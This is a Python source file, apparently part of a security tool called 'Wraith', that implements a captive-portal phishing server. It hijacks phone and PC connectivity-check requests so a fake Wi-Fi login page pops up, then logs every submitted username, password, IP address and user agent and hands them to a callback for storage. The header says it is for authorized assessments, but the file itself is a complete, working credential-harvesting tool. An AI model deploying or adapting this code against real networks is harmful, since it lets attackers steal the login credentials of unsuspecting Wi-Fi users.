"""强制门户（Captive Portal）服务.

- 纯 asyncio 实现，无额外依赖；
- 劫持 Android / Apple / Windows 的连通性探测请求，触发系统门户弹窗；
- 收集表单提交并通过回调落库（由调用方写入凭证表与事件总线）。

⚠️ 仅用于授权评估。默认页面为通用认证模板，不包含任何第三方品牌素材。
"""

from __future__ import annotations

import asyncio
import html
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable

DEFAULT_PORTAL_HTML = """<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{title}}</title>
<style>
  :root { color-scheme: light dark; }
  * { box-sizing: border-box; }
  body { margin:0; min-height:100vh; display:grid; place-items:center;
         font-family: -apple-system, "Segoe UI", "PingFang SC", "Microsoft YaHei", sans-serif;
         background: radial-gradient(1200px 600px at 20% 0%, #1d4ed8 0%, #0f172a 55%, #020617 100%);
         color:#e5e7eb; padding:24px; }
  .card { width:100%; max-width:420px; background:rgba(15,23,42,.92);
          border:1px solid rgba(148,163,184,.25); border-radius:18px; padding:28px 26px;
          box-shadow:0 24px 80px rgba(0,0,0,.55); backdrop-filter: blur(8px); }
  .logo { width:52px; height:52px; border-radius:14px; display:grid; place-items:center;
          background:linear-gradient(135deg,#3b82f6,#8b5cf6); font-size:26px; margin-bottom:18px; }
  h1 { font-size:20px; margin:0 0 6px; }
  .sub { color:#94a3b8; font-size:13px; margin:0 0 22px; line-height:1.5; }
  .net { display:flex; align-items:center; gap:8px; padding:10px 12px; margin-bottom:18px;
         background:rgba(59,130,246,.12); border:1px solid rgba(59,130,246,.3);
         border-radius:10px; font-size:13px; color:#bfdbfe; }
  label { display:block; font-size:12px; color:#cbd5e1; margin:14px 0 6px; }
  input { width:100%; padding:12px 14px; border-radius:10px; border:1px solid #334155;
          background:#0b1220; color:#e2e8f0; font-size:15px; outline:none; }
  input:focus { border-color:#3b82f6; box-shadow:0 0 0 3px rgba(59,130,246,.2); }
  button { width:100%; margin-top:20px; padding:13px; border:0; border-radius:10px;
           background:linear-gradient(135deg,#3b82f6,#6366f1); color:#fff;
           font-size:15px; font-weight:600; cursor:pointer; }
  button:active { transform: translateY(1px); }
  .foot { margin-top:18px; font-size:11px; color:#64748b; text-align:center; line-height:1.6; }
</style>
</head>
<body>
  <main class="card">
    <div class="logo">📶</div>
    <h1>{{title}}</h1>
    <p class="sub">当前网络需要完成身份验证后才能访问互联网。</p>
    <div class="net">📡 网络：<strong>{{ssid}}</strong></div>
    <form method="POST" action="/submit" autocomplete="off">
      <label for="username">账号 / 手机号</label>
      <input id="username" name="username" type="text" placeholder="请输入账号" required>
      <label for="password">密码</label>
      <input id="password" name="password" type="password" placeholder="请输入密码" required>
      <button type="submit">连接网络</button>
    </form>
    <div class="foot">连接即表示同意网络使用条款<br>{{footer}}</div>
  </main>
</body>
</html>
"""

SUCCESS_HTML = """<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>连接成功</title>
<style>body{margin:0;min-height:100vh;display:grid;place-items:center;background:#020617;
color:#e2e8f0;font-family:-apple-system,"PingFang SC",sans-serif;text-align:center}
.b{font-size:56px;margin-bottom:16px}p{color:#94a3b8}</style></head>
<body><div><div class="b">✅</div><h1>验证成功</h1><p>您已连接到网络，可以开始上网。</p></div></body></html>
"""


@dataclass
class PortalStats:
    hits: int = 0
    submissions: int = 0
    credentials: list[dict[str, Any]] = field(default_factory=list)


class PortalServer:
    def __init__(
        self,
        *,
        host: str = "127.0.0.1",
        port: int = 0,
        ssid: str = "",
        title: str = "Wi-Fi 网络认证",
        footer: str = "Wraith 授权安全评估",
        on_credential: Callable[[dict[str, Any]], None] | None = None,
        on_request: Callable[[str], None] | None = None,
        template_path: str | Path | None = None,
    ) -> None:
        self.host = host
        self.requested_port = port
        self.port = port
        self.ssid = ssid
        self.title = title
        self.footer = footer
        self.on_credential = on_credential
        self.on_request = on_request
        self.template_path = Path(template_path) if template_path else None
        self._server: asyncio.Server | None = None
        self.stats = PortalStats()
        self._template = self._load_template()

    # ------------------------------------------------------------------ 模板
    def _load_template(self) -> str:
        if self.template_path and self.template_path.exists():
            try:
                return self.template_path.read_text(encoding="utf-8")
            except OSError:
                pass
        return DEFAULT_PORTAL_HTML

    def render(self) -> str:
        return (
            self._template.replace("{{title}}", html.escape(self.title))
            .replace("{{ssid}}", html.escape(self.ssid or "Wi-Fi"))
            .replace("{{footer}}", html.escape(self.footer))
        )

    # ------------------------------------------------------------------ 生命周期
    async def start(self) -> int:
        last_error: Exception | None = None
        for port in self._candidates():
            try:
                self._server = await asyncio.start_server(self._handle, self.host, port)
                self.port = self._server.sockets[0].getsockname()[1]
                return self.port
            except OSError as exc:
                last_error = exc
                continue
        raise RuntimeError(f"门户服务启动失败: {last_error}")

    def _candidates(self) -> list[int]:
        # 0 表示由内核分配随机空闲端口（演示模式）
        if self.requested_port == 0:
            return [0]
        ports: list[int] = []
        if self.requested_port:
            ports.append(self.requested_port)
        ports.extend([80, 8080, 8888, 0])
        seen: set[int] = set()
        out: list[int] = []
        for port in ports:
            if port not in seen:
                seen.add(port)
                out.append(port)
        return out

    async def stop(self) -> None:
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:  # noqa: BLE001
                pass
            self._server = None

    @property
    def running(self) -> bool:
        return self._server is not None

    @property
    def url(self) -> str:
        host = "127.0.0.1" if self.host in {"0.0.0.0", ""} else self.host
        return f"http://{host}:{self.port}/"

    # ------------------------------------------------------------------ HTTP
    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        try:
            await asyncio.wait_for(self._serve(reader, writer), timeout=15)
        except (asyncio.TimeoutError, ConnectionError, asyncio.IncompleteReadError):
            pass
        except Exception:  # noqa: BLE001
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:  # noqa: BLE001
                pass

    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
        request_line = await reader.readline()
        if not request_line:
            return
        try:
            method, raw_path, _ = request_line.decode("latin-1").split(" ", 2)
        except ValueError:
            await self._respond(writer, 400, "text/plain", b"bad request")
            return

        headers: dict[str, str] = {}
        while True:
            line = await reader.readline()
            if not line or line in (b"\r\n", b"\n"):
                break
            key, _, value = line.decode("latin-1").partition(":")
            headers[key.strip().lower()] = value.strip()

        length = 0
        try:
            length = min(int(headers.get("content-length", "0") or 0), 32768)
        except ValueError:
            length = 0
        body = await reader.readexactly(length) if length > 0 else b""

        parsed = urllib.parse.urlsplit(raw_path)
        path = parsed.path or "/"
        self.stats.hits += 1
        if self.on_request:
            try:
                client = (writer.get_extra_info("peername") or ("", 0))[0]
                self.on_request(
                    f"{method} {path} host={headers.get('host', '')} "
                    f"ua={headers.get('user-agent', '')[:60]} from {client}"
                )
            except Exception:  # noqa: BLE001
                pass

        # 强制门户探测路径：直接返回门户页面（200 HTML）而不是 302。
        # iOS/Android/Windows 只要发现内容不是预期的 Success/204，就会判定为
        # 强制门户并弹出登录页；少一次重定向，兼容性更好。
        if path in {
            "/generate_204",
            "/gen_204",
            "/hotspot-detect.html",
            "/library/test/success.html",
            "/connecttest.txt",
            "/ncsi.txt",
            "/redirect",
            "/success.txt",
        }:
            page = self.render().encode("utf-8")
            await self._respond(writer, 200, "text/html; charset=utf-8", page)
            return
        if path == "/success":
            await self._respond(writer, 200, "text/html; charset=utf-8", SUCCESS_HTML.encode())
            return
        if path == "/favicon.ico":
            await self._respond(writer, 204, "image/x-icon", b"")
            return
        if method == "POST" and path in {"/submit", "/"}:
            await self._handle_submit(writer, headers, body)
            return
        if method in {"GET", "HEAD"}:
            page = self.render().encode("utf-8")
            await self._respond(writer, 200, "text/html; charset=utf-8", b"" if method == "HEAD" else page)
            return
        await self._respond(writer, 405, "text/plain", b"method not allowed")

    async def _handle_submit(
        self,
        writer: asyncio.StreamWriter,
        headers: dict[str, str],
        body: bytes,
    ) -> None:
        try:
            form = urllib.parse.parse_qs(body.decode("utf-8", "replace"), keep_blank_values=True)
            flat = {k: (v[0] if v else "") for k, v in form.items()}
        except Exception:  # noqa: BLE001
            flat = {}
        username = flat.get("username") or flat.get("email") or flat.get("user") or ""
        password = flat.get("password") or flat.get("pass") or ""
        if not username and not password:
            # 兼容 JSON 提交
            try:
                import json

                payload = json.loads(body.decode("utf-8", "replace") or "{}")
                if isinstance(payload, dict):
                    username = str(payload.get("username") or payload.get("email") or "")
                    password = str(payload.get("password") or "")
            except Exception:  # noqa: BLE001
                pass
        record = {
            "username": username,
            "password": password,
            "ip": (writer.get_extra_info("peername") or ("", 0))[0],
            "user_agent": headers.get("user-agent", ""),
        }
        self.stats.submissions += 1
        self.stats.credentials.append(record)
        if self.on_credential:
            try:
                self.on_credential(record)
            except Exception:  # noqa: BLE001
                pass
        await self._redirect(writer, "/success", status=303)

    async def _respond(
        self,
        writer: asyncio.StreamWriter,
        status: int,
        content_type: str,
        body: bytes,
        extra_headers: dict[str, str] | None = None,
    ) -> None:
        reason = {200: "OK", 204: "No Content", 302: "Found", 303: "See Other", 400: "Bad Request", 405: "Method Not Allowed"}.get(status, "OK")
        headers = {
            "Content-Type": content_type,
            "Content-Length": str(len(body)),
            "Cache-Control": "no-store, no-cache, must-revalidate",
            "Connection": "close",
        }
        if extra_headers:
            headers.update(extra_headers)
        head = f"HTTP/1.1 {status} {reason}\r\n" + "".join(
            f"{k}: {v}\r\n" for k, v in headers.items()
        ) + "\r\n"
        writer.write(head.encode("latin-1") + body)
        await writer.drain()

    async def _redirect(self, writer: asyncio.StreamWriter, location: str, status: int = 302) -> None:
        await self._respond(writer, status, "text/html; charset=utf-8", b"", {"Location": location})
